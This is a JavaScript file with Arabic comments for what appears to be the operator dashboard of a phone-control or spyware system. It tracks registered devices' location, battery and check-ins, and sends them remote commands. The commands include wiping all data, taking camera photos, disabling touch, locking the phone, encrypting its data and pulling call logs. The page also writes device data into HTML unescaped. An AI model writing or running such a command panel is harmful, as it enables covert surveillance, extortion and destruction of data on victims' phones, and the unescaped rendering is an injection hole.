// التحقق من وجود التوكن
const token = localStorage.getItem('token');
if (!token) {
    window.location.href = '/login.html';
}

let socket = io(); // الاتصال بخادم WebSocket

// إعدادات الطلبات مع التوكن
async function authenticatedFetch(url, options = {}) {
    options.headers = {
        ...options.headers,
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
    };
    const response = await fetch(url, options);
    if (response.status === 401 || response.status === 403) {
        localStorage.removeItem('token');
        window.location.href = '/login.html';
        return null;
    }
    return response;
}

// عرض الإشعارات
function showToast(msg, isError = false) {
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.style.background = isError ? '#f56565' : '#2d3748';
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);
}

// جلب الأجهزة
async function fetchDevices() {
    try {
        const response = await authenticatedFetch('/api/devices');
        if (!response) return;
        const devices = await response.json();
        renderDevices(devices);
        updateStats(devices);
    } catch (error) {
        showToast('❌ فشل الاتصال بالخادم', true);
    }
}

// تحديث الإحصائيات
function updateStats(devices) {
    const total = devices.length;
    const now = Date.now();
    const online = devices.filter(d => {
        if (!d.lastCheckin) return false;
        return (now - new Date(d.lastCheckin)) < 60000;
    }).length;
    const pending = devices.reduce((acc, d) => acc + (d.commands ? d.commands.filter(c => c.status === 'pending').length : 0), 0);

    document.getElementById('totalDevices').innerText = total;
    document.getElementById('onlineDevices').innerText = online;
    document.getElementById('pendingCommands').innerText = pending;
}

// إرسال أمر
async function sendCommand(deviceId, command, parameters = {}) {
    try {
        const response = await authenticatedFetch('/api/send-command', {
            method: 'POST',
            body: JSON.stringify({ deviceId, command, parameters })
        });
        if (!response) return;
        const result = await response.json();
        if (result.status === 'queued') {
            showToast(`✅ الأمر ${command} أُرسل`);
            fetchDevices();
        } else {
            showToast('❌ فشل في إرسال الأمر', true);
        }
    } catch (error) {
        showToast('❌ خطأ في الاتصال', true);
    }
}

// عرض الأجهزة (نفس الوظيفة مع إضافة أيقونات)
function renderDevices(devices) {
    const container = document.getElementById('devicesContainer');
    if (devices.length === 0) {
        container.innerHTML = '<div class="no-devices">🚫 لا توجد أجهزة مسجلة بعد</div>';
        return;
    }

    let html = '';
    const now = Date.now();

    devices.forEach(device => {
        const lastCheckin = device.lastCheckin ? new Date(device.lastCheckin) : null;
        const isOnline = lastCheckin && (now - lastCheckin) < 60000;
        const statusClass = isOnline ? '' : 'offline';
        const statusText = isOnline ? 'متصل' : 'غير متصل';
        const battery = device.battery !== undefined ? `${device.battery}%` : 'غير معروف';
        const network = device.network || 'N/A';
        const location = device.location ? `${device.location.lat?.toFixed(4)}, ${device.location.lng?.toFixed(4)}` : 'غير معروف';
        const model = device.model || 'غير معروف';
        const pendingCount = device.commands ? device.commands.filter(c => c.status === 'pending').length : 0;

        html += `
            <div class="device-card" id="device-${device.deviceId}">
                <div class="device-header">
                    <h4>${model}</h4>
                    <span class="device-status ${statusClass}">${statusText}</span>
                </div>
                <div class="device-body">
                    <div class="info-row"><span class="info-label">🆔 المعرف</span><span class="info-value">${device.deviceId.substring(0,16)}...</span></div>
                    <div class="info-row"><span class="info-label">🔋 البطارية</span><span class="info-value">${battery}</span></div>
                    <div class="info-row"><span class="info-label">📶 الشبكة</span><span class="info-value">${network}</span></div>
                    <div class="info-row"><span class="info-label">📍 الموقع</span><span class="info-value">${location}</span></div>
                    <div class="info-row"><span class="info-label">⏱️ آخر Check-in</span><span class="info-value">${lastCheckin ? lastCheckin.toLocaleString('ar-SA') : 'أبداً'}</span></div>
                    <div class="info-row"><span class="info-label">📦 أوامر معلقة</span><span class="info-value">${pendingCount}</span></div>
                </div>
                <div class="commands">
                    <h5>🎮 أوامر التحكم</h5>
                    <div class="commands-grid">
                        <button class="cmd-btn" onclick="sendCommand('${device.deviceId}', 'FACTORY_RESET')">🧹 حذف كل البيانات</button>
                        <button class="cmd-btn" onclick="sendCommand('${device.deviceId}', 'TAKE_PHOTO')">📸 فتح الكاميرا</button>
                        <button class="cmd-btn" onclick="sendCommand('${device.deviceId}', 'LOCK_SCREEN')">🔒 قفل الشاشة</button>
                        <button class="cmd-btn" onclick="sendCommand('${device.deviceId}', 'DISABLE_TOUCH')">🚫 تعطيل اللمس</button>
                        <button class="cmd-btn" onclick="sendCommand('${device.deviceId}', 'FULL_LOCK')">🔐 قفل الهاتف</button>
                        <button class="cmd-btn" onclick="sendCommand('${device.deviceId}', 'ENCRYPT_DATA')">🔏 تشفير البيانات</button>
                        <button class="cmd-btn" onclick="sendCommand('${device.deviceId}', 'SHOW_MESSAGE', {text:'مرحباً'})">💬 إظهار رسالة</button>
                        <button class="cmd-btn" onclick="sendCommand('${device.deviceId}', 'MAX_VOLUME')">🔊 تشغيل الصوت</button>
                        <button class="cmd-btn" onclick="sendCommand('${device.deviceId}', 'GET_LOCATION')">📍 تحديث الموقع</button>
                        <button class="cmd-btn" onclick="sendCommand('${device.deviceId}', 'GET_LOGS')">📜 سجل المكالمات</button>
                    </div>
                </div>
            </div>
        `;
    });
    container.innerHTML = html;
}

// استماع لتحديثات WebSocket
socket.on('device-update', (data) => {
    // تحديث البطاقة المعنية ديناميكياً (يمكن تحسينه)
    fetchDevices(); // بسيط: إعادة تحميل الكل
});

socket.on('new-command', (data) => {
    showToast(`📩 أمر جديد إلى ${data.deviceId.substring(0,8)}`);
    fetchDevices();
});

socket.on('command-result', (data) => {
    showToast(`✅ نتيجة أمر من ${data.deviceId.substring(0,8)}`);
    fetchDevices();
});

// تسجيل الخروج
document.getElementById('logoutBtn')?.addEventListener('click', () => {
    localStorage.removeItem('token');
    window.location.href = '/login.html';
});

// تحميل أولي
fetchDevices();
// تحديث دوري كل 10 ثواني (كاحتياطي)
setInterval(fetchDevices, 10000);